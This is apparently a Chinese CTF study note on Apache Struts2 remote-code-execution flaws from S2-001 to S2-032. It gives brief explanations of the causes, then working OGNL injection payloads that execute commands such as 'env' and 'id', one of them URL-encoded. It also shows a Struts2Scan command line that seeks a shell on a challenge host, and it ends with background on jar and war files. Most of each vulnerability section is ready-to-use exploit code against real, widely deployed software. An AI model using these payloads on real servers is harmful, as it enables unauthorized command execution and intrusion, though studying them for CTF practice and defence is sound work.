# JAVA漏洞

<br>


### Struts2漏洞脚本

- [Struts2Scan](https://github.com/Vancomycin-g/Struts2Scan)

<br>

例子：使用S2-009漏洞获取shell

-u url

-n 漏洞名称

-e 命令行

````
python3 Struts2Scan.py -u http://b03293c4-fdd9-4c93-8861-d521da0383bf.challenge.ctf.show/S2-009/showcase.action -n S2-008 -e

````

<br>

### S2-001


playload ：

````

%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"env"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}

````

<br>

原理:

<br>

这是一段针对 Struts2 框架的远程代码执行（RCE）攻击代码。该攻击利用了 Struts2 过滤器没有正确处理 OGNL 表达式中 #{} 情况的漏洞，导致攻击者可以在 HTTP 请求中注入任意代码，从而执行任意命令。
具体来说，这段代码会创建一个新的进程，并执行 "env" 命令，将结果输出到 InputStream 中。然后通过 BufferedReader 和 char 数组等方式读取 InputStream 中的内容，并将结果输出到 HttpServletResponse 中，最终返回给攻击者。

<br>

### S2-005


原理:

<br>

对于S2-003，Struts2将HTTP的每个参数名解析为ognl语句执行,而ognl表达式是通过#来访问struts的对象，Struts2框架虽然过滤了#来进行过滤，但是可以通过unicode编码（u0023）或8进制（43）绕过了安全限制，达到代码执行的效果
再看S2-005
S2-005和S2-003的原理是类似的，因为官方在修补S2-003不全面，导致用户可以绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成的漏洞，可以说是升级版的S2-005是升级版的S2-003


<br>


## S2-007 S2-008 S2-009用脚本通杀就完了

<br>

### S2-012


原理:

<br>

如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：

<package name="S2-012" extends="struts-default"> <action name="user" class="com.demo.action.UserAction"> <result name="redirect" type="redirect">/index.jsp?name=${name}</result> <result name="input">/index.jsp</result> <result name="success">/index.jsp</result> </action> </package>

这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行

影响版本: 2.1.0 - 2.3.13

https://blog.51cto.com/u_15878568/5955193

<br>

playload ：

````
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"env"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}

````

<br>

## S2-013 S2-015 S2-016用脚本通杀就完了

<br>

## S2-015

原理:

<br>

漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：
````
<package name="S2-015" extends="struts-default"> <action name="*" class="com.demo.action.PageAction"> <result>/{1}.jsp</result> </action> </package>
````
上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 / " \ 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功

还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的 setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 ​​#_memberAccess['allowStaticMethodAccess']=true​​ 来修改其值达到重获静态方法调用的能力

https://blog.51cto.com/u_15878568/5955193


url编码发送:

````
%24%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%69%64%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d%2e%61%63%74%69%6f%6e
````


## S2-019

<br>

原理：
动态方法调用是一种已知会施加可能的安全漏洞的机制，但到目前为止，它默认启用，警告用户应尽可能将其关闭。这样就存在远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码

<br>

playload:(放在url后面)

<br>

````
/HelloWorld.action?debug=command&expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27env%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28new%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A                                                                                                                                                                      
````

## S2-032

playload:(放在url后面)

原理:

Struts框架被强制执行时，对分配给某些标签的属性值进行双重评估，因此可以传入一个值，当一个标签的属性将被渲染时，该值将被再次评估
例如：代码执行过程大致为先尝试获取value的值，如果value为空，那么就二次解释执行了name。并且在执行前给name加上了”%{}”。最终造成二次执行
影响版本：Struts 2.0.0 - Struts 2.3.24.1（2.3.20.3除外）


<br>

````
default.action?message=(%23_memberAccess['allowPrivateAccess']=true,%23_memberAccess['allowProtectedAccess']=true,%23_memberAccess['excludedPackageNamePatterns']=%23_memberAccess['acceptProperties'],%23_memberAccess['excludedClasses']=%23_memberAccess['acceptProperties'],%23_memberAccess['allowPackageProtectedAccess']=true,%23_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('env').getInputStream()))

````

<br>

## S2-046 不会
## S2-045 脚本通杀
## 反编译

jar包和war包都可以看成压缩文件，都可以用解压软件打开，jar包和war包都是为了项目的部署和发布，通常在打包部署的时候，会在里面加上部署的相关信息。这个打包实际上就是把代码和依赖的东西压缩在一起，变成后缀名为.jar和.war的文件，就是我们说的jar包和war包。但是这个“压缩包”可以被编译器直接使用，把war包放在tomcat目录的webapp下，tomcat服务器在启动的时候可以直接使用这个war包。通常tomcat的做法是解压，编译里面的代码，所以当文件很多的时候，tomcat的启动会很慢。

<br>

jar包和war包的区别：jar包是java打的包，war包可以理解为javaweb打的包，这样会比较好记。jar包中只是用java来写的项目打包来的，里面只有编译后的class和一些部署文件。而war包里面的东西就全了，包括写的代码编译成的class文件，依赖的包，配置文件，所有的网站页面，包括html，jsp等等。一个war包可以理解为是一个web项目，里面是项目的所有东西。
